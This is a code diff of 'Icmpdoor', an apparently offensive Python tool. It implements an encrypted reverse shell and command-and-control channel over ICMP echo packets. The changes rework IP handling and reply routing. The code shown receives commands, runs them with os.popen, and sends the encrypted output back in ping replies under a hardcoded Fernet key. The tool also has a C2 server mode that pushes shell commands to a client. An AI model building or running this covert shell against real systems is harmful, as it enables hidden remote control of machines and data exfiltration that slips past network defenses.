@@ -18,17 +18,13 @@ More info: https://cryptsus.com/blog/icmp-reverse-shell.html
 """
 
 class Icmpdoor():
-    __slots__ = ('ICMP_ID', 'OTP', 'TTL', 'args', 'clientIP', 'seqCounter', 'serverIP', 'svr')
+    __slots__ = ('ICMP_ID', 'OTP', 'TTL', 'args', 'destination_ip', 'seqCounter', 'svr')
     def __init__(self, args):
         """A class for tracking and encrypting the shell"""
         if args.destination_ip is None:
-            self.clientIP = '192.168.0.101'                                     ## CHANGE ME MAYBE
-            self.serverIP = '192.168.0.107'                                     ## CHANGE ME MAYBE
+            self.destination_ip = '192.168.0.100'                               ## CHANGE ME MAYBE
         else:
-            if args.mode == 'server':
-                self.clientIP = args.destination_ip
-            else:
-                self.serverIP = args.destination_ip
+            self.destination_ip = args.destination_ip
         self.seqCounter = 1
         if args.otp is None:
             self.OTP = Fernet(b'qr0qsfv7AXgw0Iwh4lQ31wZGadH2dZTpqoFydU7wAZw=')  ## CHANGE ME MAYBE
@@ -61,7 +57,7 @@ class Icmpdoor():
         def snarf(pkt):
             try:
                 if self.args.plaintext is False:
-                    ipkt = self.OTP.decrypt(pkt[Raw].load.decode('utf-8', errors = 'ignore')).decode()
+                    ipkt = self.OTP.decrypt(pkt[Raw].load).decode('utf-8', errors = 'ignore')
                 else:
                     ipkt =pkt[Raw].load.decode('utf-8', errors = 'ignore')
                 if ipkt == '___otp___':
@@ -70,14 +66,14 @@ class Icmpdoor():
                     sys.exit(0)
                 else:
                     payload = os.popen(ipkt).readlines()
-            except:
+            except Exception as E:
                 return False
             try:
                 if self.args.plaintext is False:
                     OTP = self.OTP.encrypt('___42___'.join(payload).encode('utf-8'))
                 else:
                     OTP = '___42___'.join(payload).encode('utf-8')
-                icmppacket = (IP(dst = self.serverIP, ttl = self.TTL)/\
+                icmppacket = (IP(dst = pkt[IP].src, ttl = self.TTL)/\
                               ICMP(type = 0, id = self.ICMP_ID, seq = self.seqCounter)/\
                               Raw(load = OTP))
                 if self.args.interface is None:
@@ -159,7 +155,7 @@ if __name__ == '__main__':
 
         ## Client mode
         if args.mode is None or args.mode == 'client':
-            LFILTER = idr.LFILTER((idr.serverIP, 8))
+            LFILTER = idr.LFILTER((idr.destination_ip, 8))
             PRN = idr.clientShell()
             print("[+]ICMP listener starting!")
             if args.interface is None:
@@ -176,7 +172,7 @@ if __name__ == '__main__':
 
         ## Server mode
         else:
-            LFILTER = idr.LFILTER((idr.clientIP, 0))
+            LFILTER = idr.LFILTER((idr.destination_ip, 0))
             sniffing = Process(target = idr.serverSniff)
             sniffing.start()
             print("[+]ICMP C2 started!")
@@ -190,11 +186,11 @@ if __name__ == '__main__':
                     pass
                 else:
                     if args.plaintext is False:
-                        payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
+                        payload = (IP(dst = idr.destination_ip, ttl = idr.TTL)/\
                                    ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
                                    Raw(load = idr.OTP.encrypt(icmpshell.encode())))
                     else:
-                        payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
+                        payload = (IP(dst = idr.destination_ip, ttl = idr.TTL)/\
                                    ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
                                    Raw(load = icmpshell.encode()))
                     if args.interface is None:
